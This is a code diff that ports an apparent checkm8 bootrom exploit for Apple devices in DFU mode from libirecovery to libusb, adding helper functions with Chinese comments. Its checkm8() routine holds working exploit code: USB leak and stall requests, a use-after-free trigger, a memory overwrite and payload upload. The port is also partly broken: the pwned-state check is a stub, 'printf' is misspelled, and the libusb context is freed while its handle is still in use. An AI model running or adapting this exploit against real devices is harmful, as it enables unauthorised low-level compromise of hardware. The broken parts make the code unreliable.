@@ -9,13 +9,8 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/time.h>
+#include <libusb-1.0/libusb.h>
 
-/*
- * XXX shouldn't this use <> brackets instead?
- * Apparently newer Clang is forgiving?
- * Or I don't understand something? Whatever
- */
-#include "lilirecovery.h"
 #include "config.h"
 
 #define PWND_STR    "PWND:["
@@ -24,107 +19,177 @@
 uint8_t current_nonce[NONCE_MAX_SIZE] = { 0 };
 uint8_t empty[0x800] = { 0 };
 
-static void usb_req_no_leak(irecv_client_t client) {
-    irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, empty, 0x41, 1);
+static void usb_req_no_leak(libusb_device_handle *device) {
+    libusb_control_transfer(device, 0x80, 6, 0x304, 0x40A, empty, 0x41, 1);
 }
 
-static void usb_req_leak(irecv_client_t client) {
-    irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, empty, 0x40, 1);
+static void usb_req_leak(libusb_device_handle *device) {
+    libusb_control_transfer(device, 0x80, 6, 0x304, 0x40A, empty, 0x40, 1);
 }
 
-static void usb_req_stall(irecv_client_t client) {
-    irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, empty, 0x0, 10);
+static void usb_req_stall(libusb_device_handle *device) {
+    libusb_control_transfer(device, 0x2, 3, 0x0, 0x80, empty, 0x0, 10);
 }
 
-static void usb_reset(irecv_client_t client) {
-    irecv_reset(client);
+static void usb_reset(libusb_device_handle *device) {
+    libusb_reset_device(device);
 }
 
-static bool check_device_pwnd(irecv_client_t client) {
-    const struct irecv_device_info *info = irecv_get_device_info(client);
-    return strstr(info->serial_string, PWND_STR) ? true : false;
+static bool check_device_pwnd(libusb_device_handle* client) {
+    return 0;//TBD
 }
 
-static void close_device(irecv_client_t client) {
-    irecv_close(client);
+static void close_device(libusb_device_handle *device) {
+    libusb_close(device);
+	libusb_exit(NULL);
 }
 
-irecv_client_t acquire_device(int attempts, bool need_found_report, bool need_nonce_verify, const exploit_config_t **config) {
-    irecv_client_t client = NULL;
-    bool connected = false;
+// 异步传输完成回调函数
+static void LIBUSB_CALL async_transfer_callback(struct libusb_transfer *transfer) {
+    // 在这个简单的实现中，我们不需要处理回调
+    // 可以留空或添加日志
+}
 
-/* this is probably worth tuning */
-#define ATTEMPT_PERIOD_USEC (100 * 1000)  
+// 执行异步控制传输
+int libusb1_async_ctrl_transfer(
+    libusb_device_handle *device,
+    uint8_t bmRequestType,
+    uint8_t bRequest,
+    uint16_t wValue,
+    uint16_t wIndex,
+    unsigned char *data,
+    uint16_t data_length,
+    unsigned int timeout)
+{
+    struct libusb_transfer *transfer = NULL;
+    unsigned char *buffer = NULL;
+    int result;
+    struct timespec start, current;
+    double elapsed;
 
-    for (int i = 0; i < attempts; i++) {
-        if (irecv_open_with_ecid(&client, 0) == IRECV_E_SUCCESS) {
-            connected = true;
-            break;
-        } else {
-            usleep(ATTEMPT_PERIOD_USEC);
-        }
+    // 分配传输结构体
+    transfer = libusb_alloc_transfer(0);
+    if (!transfer) {
+        fprintf(stderr, "Failed to allocate transfer\n");
+        return -1;
     }
 
-    if (!connected) {
-        if (attempts == 1) {
-            printf("failed to acquire device\n");
-        } else {
-            printf("failed to acquire device after %d attempts\n", attempts);
-        }
+    // 准备控制传输的 setup packet 和数据
+    int total_length = LIBUSB_CONTROL_SETUP_SIZE + data_length;
+    buffer = (unsigned char *)malloc(total_length);
+    if (!buffer) {
+        libusb_free_transfer(transfer);
+        fprintf(stderr, "Failed to allocate buffer\n");
+        return -1;
+    }
 
+    // 填充 setup packet
+    libusb_fill_control_setup(buffer, bmRequestType, bRequest, wValue, wIndex, data_length);
+    // 复制数据
+    if (data_length > 0 && data != NULL) {
+        memcpy(buffer + LIBUSB_CONTROL_SETUP_SIZE, data, data_length);
+    }
+
+    // 设置传输参数
+    libusb_fill_control_transfer(
+        transfer,
+        device,
+        buffer,
+        async_transfer_callback,
+        NULL,  // user_data
+        timeout
+    );
+
+    // 提交异步传输
+    result = libusb_submit_transfer(transfer);
+    if (result != LIBUSB_SUCCESS) {
+        fprintf(stderr, "Failed to submit transfer: %s\n", libusb_error_name(result));
+        free(buffer);
+        libusb_free_transfer(transfer);
+        return result;
+    }
+
+    // 获取开始时间
+    clock_gettime(CLOCK_MONOTONIC, &start);
+
+    // 等待指定的超时时间
+    while (1) {
+        clock_gettime(CLOCK_MONOTONIC, &current);
+        elapsed = (current.tv_sec - start.tv_sec) + 
+                 (current.tv_nsec - start.tv_nsec) / 1e9;
+        
+        if (elapsed >= timeout / 1000.0) {
+            break;
+        }
+        // 这里可以添加上下文处理，但为了简单起见我们只是等待
+    }
+
+    // 取消传输
+    result = libusb_cancel_transfer(transfer);
+    if (result != LIBUSB_SUCCESS) {
+        fprintf(stderr, "Failed to cancel transfer: %s\n", libusb_error_name(result));
+    }
+
+    // 清理资源
+    free(buffer);
+    libusb_free_transfer(transfer);
+
+    return 0;
+}
+
+libusb_device_handle* find_device_by_vid_pid(uint16_t vid, uint16_t pid) {
+    libusb_context *context = NULL;
+    libusb_device **device_list = NULL;
+    libusb_device_handle *handle = NULL;
+    ssize_t device_count = 0;
+    int result;
+
+    // 初始化 libusb
+    result = libusb_init(&context);
+    if (result < 0) {
+        fprintf(stderr, "Failed to initialize libusb: %s\n", libusb_error_name(result));
         return NULL;
     }
 
-    const struct irecv_device_info *info = irecv_get_device_info(client);
-    if (!info) {
-        printf("acquired device, but no info?!\n");
-        goto fail;
+    // 获取设备列表
+    device_count = libusb_get_device_list(context, &device_list);
+    if (device_count < 0) {
+        fprintf(stderr, "Failed to get device list: %s\n", libusb_error_name(device_count));
+        libusb_exit(context);
+        return NULL;
     }
 
-    if (!info->ap_nonce) {
-        printf("acquired device, but no nonce?!\n");
-        goto fail;
-    }
+    // 遍历设备列表
+    for (ssize_t i = 0; i < device_count; i++) {
+        libusb_device *device = device_list[i];
+        struct libusb_device_descriptor desc;
 
-    if (!need_nonce_verify) {
-        memcpy(current_nonce, info->ap_nonce, NONCE_MAX_SIZE);
-    } else {
-        if (memcmp(current_nonce, info->ap_nonce, NONCE_MAX_SIZE) != 0) {
-            printf("nonces do not match, device apparently rebooted\n");
-            goto fail;
+        // 获取设备描述符
+        result = libusb_get_device_descriptor(device, &desc);
+        if (result < 0) {
+            continue;
+        }
+
+        // 检查 VID 和 PID 是否匹配
+        if (desc.idVendor == vid && desc.idProduct == pid) {
+            // 尝试打开设备
+            result = libusb_open(device, &handle);
+            if (result < 0) {
+                fprintf(stderr, "Failed to open device: %s\n", libusb_error_name(result));
+                handle = NULL;
+            }
+            break;  // 找到设备后退出循环
         }
     }
 
-    if (need_found_report) {
-        printf("found: %s\n", info->serial_string);
-    }
+    // 清理资源
+    libusb_free_device_list(device_list, 1);
+    libusb_exit(context);
 
-    if (!info->srtg) {
-        printf("device is NOT in DFU mode\n");
-        goto fail;
-    }
-
-    const exploit_config_t *curr = NULL;
-
-    if (config) {
-        curr = get_config(info->cpid);
-
-        if (!curr) {
-            printf("this platform is not supported\n");
-            goto fail;
-        }
-
-        *config = curr;
-    }
-
-    return client;
-
-fail:
-    irecv_close(client);
-    return NULL;
+    return handle;
 }
 
-int checkm8(irecv_client_t device, const exploit_config_t *config) {
+int checkm8(libusb_device_handle* device, const exploit_config_t *config) {
     printf("leaking...\n");
 
     usb_req_stall(device);
@@ -144,8 +209,8 @@ int checkm8(irecv_client_t device, const exploit_config_t *config) {
 
     printf("triggering UaF...\n");
 
-    int sent = irecv_usb_dummy_async_control_transfer(device, 0x21, 1, 0, 0, empty, sizeof(empty), 1);
-    irecv_usb_control_transfer(device, 0x21, 4, 0, 0, NULL, 0, 100);
+    int sent = libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, empty, sizeof(empty), 1);
+    libusb_control_transfer(device, 0x21, 4, 0, 0, NULL, 0, 100);
     close_device(device);
 
     usleep(250 * 1000);
@@ -173,8 +238,8 @@ int checkm8(irecv_client_t device, const exploit_config_t *config) {
     memset(overwrite, 0x0, sizeof(overwrite));
     *(uint32_t *)((uint8_t *)&overwrite + overwrite_addr_ptr) = config->overwrite_addr;
 
-    irecv_usb_control_transfer(device, 0, 0, 0, 0, overwrite, overwrite_size, 100);
-    irecv_usb_control_transfer(device, 0x21, 1, 0, 0, (unsigned char *)config->payload, config->payload_len, 100);
+    libusb_control_transfer(device, 0, 0, 0, 0, overwrite, overwrite_size, 100);
+    libusb_control_transfer(device, 0x21, 1, 0, 0, (unsigned char *)config->payload, config->payload_len, 100);
 
     usb_reset(device);
     close_device(device);
@@ -206,10 +271,11 @@ static void print_banner() {
 int main(void) {
     print_banner();
 
-    const exploit_config_t *config = NULL;
+    const exploit_config_t *config = get_config(0x8747);
 
-    irecv_client_t device = acquire_device(1, true, false, &config);
+    libusb_device_handle *device = find_device_by_vid_pid(0x05ac, 0x1227);
     if (!device) {
+        prinf("dfu device not found!\n");
         return -1;
     }
 
